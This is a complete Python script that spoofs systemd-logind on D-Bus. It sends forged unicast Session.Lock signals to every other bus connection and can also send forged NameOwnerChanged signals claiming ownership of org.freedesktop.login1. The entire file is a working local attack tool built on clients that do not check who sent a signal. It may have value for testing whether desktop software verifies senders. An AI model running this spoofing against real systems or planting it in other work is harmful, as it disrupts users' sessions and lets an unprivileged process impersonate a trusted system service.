#!/usr/bin/env python3
"""A local client that is not logind, sending Session.Lock to everyone.

    spoof_lock.py ADDRESS SESSION_PATH [--count N] [--claim-owner]

Sends N (default 1) unicast org.freedesktop.login1.Session.Lock signals on
SESSION_PATH to every other connection on the bus, as fast as it can. The bus
delivers a unicast signal whatever match rules the receiver added, so only the
sender tells it from logind's. With --claim-owner, it first sends each of them
a forged NameOwnerChanged that names this client as the new owner of
org.freedesktop.login1, twice.
"""

import argparse

from jeepney import DBusAddress, new_method_call, new_signal
from jeepney.bus_messages import DBus
from jeepney.io.blocking import open_dbus_connection
from jeepney.low_level import HeaderFields

LOGIND = "org.freedesktop.login1"

parser = argparse.ArgumentParser()
parser.add_argument("address")
parser.add_argument("session_path")
parser.add_argument("--count", type=int, default=1)
parser.add_argument("--claim-owner", action="store_true")
args = parser.parse_args()

conn = open_dbus_connection(bus=args.address)
names = conn.send_and_get_reply(new_method_call(DBus(), "ListNames")).body[0]
bus = DBusAddress("/org/freedesktop/DBus", interface="org.freedesktop.DBus")
session = DBusAddress(args.session_path, interface="org.freedesktop.login1.Session")
for name in names:
    if name.startswith(":") and name != conn.unique_name:
        signals = []
        if args.claim_owner:
            claim = new_signal(bus, "NameOwnerChanged", "sss", (LOGIND, "", conn.unique_name))
            signals += [claim, claim]
        signals += [new_signal(session, "Lock")] * args.count
        for signal in signals:
            signal.header.fields[HeaderFields.destination] = name
            conn.send(signal)
# A round trip, so the bus has taken the signals before this process exits.
conn.send_and_get_reply(new_method_call(DBus(), "GetId"))
